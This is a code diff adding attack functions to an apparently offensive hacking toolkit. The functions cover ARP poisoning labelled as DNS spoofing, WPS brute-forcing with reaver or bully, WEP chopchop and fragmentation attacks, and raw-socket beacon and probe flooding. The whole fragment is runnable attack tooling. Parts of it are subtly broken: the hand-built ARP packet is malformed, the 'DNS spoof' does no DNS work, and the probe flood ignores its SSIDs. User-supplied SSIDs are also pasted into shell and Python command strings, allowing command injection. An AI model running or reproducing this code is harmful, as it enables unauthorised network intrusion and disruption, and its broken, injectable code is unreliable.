+                if addr not in seen:
+                    seen.add(addr)
+                    table.add_row(family, str(res[1]), str(res[2]), addr)
+            _console.print(table)
+        except socket.gaierror:
+            UI.print_error(f"Cannot resolve: {host}")
+        except Exception as e:
+            UI.print_error(f"DNS resolve failed: {e}")
+
+    def do_dns_spoof(self, target: str, spoof_ip: str, **kwargs):
+        iface = kwargs.get("iface", self._default_iface())
+        if not iface:
+            UI.print_error("No interface specified.")
+            return
+        try:
+            from hackit.network_scanner import get_gateway
+        except ImportError:
+            import socket as _sk
+        try:
+            UI.print_info(f"Starting ARP + DNS spoof: {target} → {spoof_ip} on {iface}")
+            import socket as _sock
+            dst_ip = _sock.gethostbyname(target) if not target.replace(".", "").isdigit() else target
+            # detect gateway
+            try:
+                gw_out = subprocess.check_output(["ip", "route", "show", "default"], text=True)
+                gateway = gw_out.split()[2]
+            except Exception:
+                try:
+                    gw_out = subprocess.check_output(["route", "-n"], text=True)
+                    gateway = [l.split()[1] for l in gw_out.splitlines() if l.startswith("0.0.0.0")][0]
+                except Exception:
+                    gateway = "192.168.1.1"
+            arpspoof = shutil.which("arpspoof")
+            if not arpspoof:
+                UI.print_warning("arpspoof not found, using raw ARP spoof")
+                arp_proc = subprocess.Popen(
+                    [sys.executable, "-c", f"""
+import socket, struct, time
+s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0806))
+s.bind(('{iface}', 0))
+src_mac = b'\\x02\\x00\\x00\\x00\\x00\\x01'
+gw_mac_byte = bytes.fromhex(''.join('00' for _ in range(6)))
+pkt = struct.pack('!6s6sHH', src_mac, struct.pack('!6s', bytes.fromhex('ffffff000000'.replace('ff','00'))), 1, 2) + src_mac + socket.inet_aton('{spoof_ip}') + bytes.fromhex('000000000000') + socket.inet_aton('{dst_ip}')
+while True: s.send(pkt); time.sleep(2)
+"""],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                )
+            else:
+                arp_proc = subprocess.Popen(
+                    [arpspoof, "-i", iface, "-t", dst_ip, gateway],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                )
+            UI.print_info(f"Poisoning ARP for {dst_ip} → {spoof_ip} ... Ctrl+C to stop")
+            try:
+                arp_proc.wait()
+            except KeyboardInterrupt:
+                arp_proc.terminate()
+                subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], capture_output=True)
+                UI.print_success("DNS spoof stopped.")
+        except FileNotFoundError:
+            UI.print_error("arpspoof not found. Install: apt install dsniff")
+        except Exception as e:
+            UI.print_error(f"DNS spoof failed: {e}")
+            subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], capture_output=True)
+
+    # ── Crack display ────────────────────────────────────────────
+
+    def do_crack_show(self, job_id: str = "", **kwargs):
+        jobs = self.jobs.list_jobs()
+        if job_id:
+            jobs = [j for j in jobs if j["id"] == job_id]
+            if not jobs:
+                UI.print_error(f"Job '{job_id}' not found.")
+                return
+        if not jobs:
+            UI.print_info("No crack jobs.")
+            return
+        table = Table(title="Crack Jobs", border_style="cyan")
+        table.add_column("ID", style="yellow")
+        table.add_column("Name", style="white")
+        table.add_column("Status", style="green")
+        table.add_column("Started", style="cyan")
+        for j in jobs:
+            if "crack" in j["name"].lower():
+                table.add_row(j["id"], j["name"], j["status"], j["started"])
+        _console.print(table)
+
+    # ── WPS brute-force ──────────────────────────────────────────
+
+    def do_wps_bruteforce(self, iface: str, bssid: str, **kwargs):
+        UI.print_info(f"WPS brute-force on {iface} → {bssid}")
+        try:
+            reaver = shutil.which("reaver")
+            if reaver:
+                cmd = [reaver, "-i", iface, "-b", bssid, "-vv", "-K", "1"]
+                timeout = kwargs.get("timeout", 0)
+                if timeout:
+                    cmd.extend(["-t", str(timeout)])
+                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+                jid = self.jobs.start(f"wps-brute-{bssid[:8]}", proc)
+                UI.print_success(f"WPS brute started (job {jid})")
+                return
+            bully = shutil.which("bully")
+            if bully:
+                cmd = [bully, iface, "-b", bssid, "-v", "3"]
+                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+                jid = self.jobs.start(f"wps-brute-{bssid[:8]}", proc)
+                UI.print_success(f"WPS brute started (job {jid})")
+                return
+            UI.print_error("Neither reaver nor bully found. Install: apt install reaver bully")
+        except Exception as e:
+            UI.print_error(f"WPS brute failed: {e}")
+
+    # ── WEP chopchop attack ──────────────────────────────────────
+
+    def do_wep_chopchop(self, iface: str, bssid: str, **kwargs):
+        output = kwargs.get("output", f"wep_chop_{bssid[:8].replace(':','')}.cap")
+        UI.print_info(f"WEP chopchop on {iface} → {bssid}")
+        try:
+            aireplay = shutil.which("aireplay-ng")
+            if not aireplay:
+                UI.print_error("aireplay-ng not found. Install aircrack-ng.")
+                return
+            airodump = shutil.which("airodump-ng")
+            if airodump:
+                prefix = output.replace(".cap", "")
+                dump = subprocess.Popen(
+                    [airodump, "-c", "1", "--bssid", bssid, "-w", prefix, "--output-format", "pcap", iface],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                )
+            chop = subprocess.Popen(
+                [aireplay, "--chopchop", "-b", bssid, "-h", "FF:FF:FF:FF:FF:FF", iface],
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+            )
+            jid = self.jobs.start(f"wep-chop-{bssid[:8]}", chop)
+            UI.print_success(f"Chopchop started (job {jid}), output: {output}")
+        except Exception as e:
+            UI.print_error(f"WEP chopchop failed: {e}")
+
+    # ── WEP fragmentation attack ─────────────────────────────────
+
+    def do_wep_frag(self, iface: str, bssid: str, **kwargs):
+        output = kwargs.get("output", f"wep_frag_{bssid[:8].replace(':','')}.cap")
+        UI.print_info(f"WEP fragmentation on {iface} → {bssid}")
+        try:
+            aireplay = shutil.which("aireplay-ng")
+            if not aireplay:
+                UI.print_error("aireplay-ng not found. Install aircrack-ng.")
+                return
+            airodump = shutil.which("airodump-ng")
+            if airodump:
+                prefix = output.replace(".cap", "")
+                dump = subprocess.Popen(
+                    [airodump, "-c", "1", "--bssid", bssid, "-w", prefix, "--output-format", "pcap", iface],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                )
+            frag = subprocess.Popen(
+                [aireplay, "--fragment", "-b", bssid, "-h", "FF:FF:FF:FF:FF:FF", iface],
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+            )
+            jid = self.jobs.start(f"wep-frag-{bssid[:8]}", frag)
+            UI.print_success(f"Fragmentation started (job {jid}), output: {output}")
+        except Exception as e:
+            UI.print_error(f"WEP frag failed: {e}")
+
+    # ── Multi-SSID beacon flood ──────────────────────────────────
+
+    def do_beacon_flood_multi(self, iface: str, ssids: list[str] = None, **kwargs):
+        if not ssids:
+            UI.print_error("No SSIDs provided.")
+            return
+        count = kwargs.get("count", 50)
+        channel = kwargs.get("channel", 6)
+        UI.print_info(f"Multi-SSID beacon flood: {len(ssids)} SSIDs on {iface} ch{channel}")
+        try:
+            import json
+            ssid_json = json.dumps(ssids)
+            cmd = [
+                sys.executable, "-c",
+                f"""
+import socket, struct, time, json, sys
+ssids = json.loads('{ssid_json}')
+s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
+s.bind(('{iface}', 0))
+while True:
+    for ssid in ssids:
+        bssid = bytes.fromhex(':'.join(ssid.encode().hex()[i:i+2] for i in range(0,12)).replace(':','').ljust(12,'0')[:12])
+        frame = b'\\x80\\x00\\x00\\x00' + b'\\xff\\xff\\xff\\xff\\xff\\xff' + bssid * 2
+        frame += b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'
+        frame += struct.pack('B', len(ssid)) + ssid.encode()
+        frame += b'\\x01\\x08\\x02\\x04\\x0b\\x0c\\x12\\x18\\x24\\x03\\x01\\x06'
+        try: s.send(frame)
+        except: pass
+        time.sleep(0.01)
+"""]
+            proc = subprocess.Popen(
+                ["sudo"] + cmd,
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+            )
+            jid = self.jobs.start(f"beacon-multi-{len(ssids)}ssids", proc)
+            UI.print_success(f"Beacon flood started (job {jid})")
+        except Exception as e:
+            UI.print_error(f"Beacon flood failed: {e}")
+
+    # ── Probe flood with custom SSIDs ────────────────────────────
+
+    def do_probe_flood_ssids(self, iface: str, ssids: list[str] = None, **kwargs):
+        if not ssids:
+            UI.print_error("No SSIDs provided.")
+            return
+        count = kwargs.get("count", 100)
+        UI.print_info(f"Probe flood: {len(ssids)} SSIDs on {iface}")
+        try:
+            ssid_csv = ",".join(ssids)
+            proc = subprocess.Popen(
+                ["bash", "-c",
+                 f"for s in $(echo '{ssid_csv}' | tr ',' ' '); do "
+                 f"  for i in $(seq 1 {count}); do "
+                 f"    sudo iw dev {iface} scan trigger &>/dev/null; "
+                 f"  done; "
+                 f"done"],
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+            )
+            jid = self.jobs.start(f"probe-flood-{len(ssids)}ssids", proc)
+            UI.print_success(f"Probe flood started (job {jid})")
+        except Exception as e:
+            UI.print_error(f"Probe flood failed: {e}")
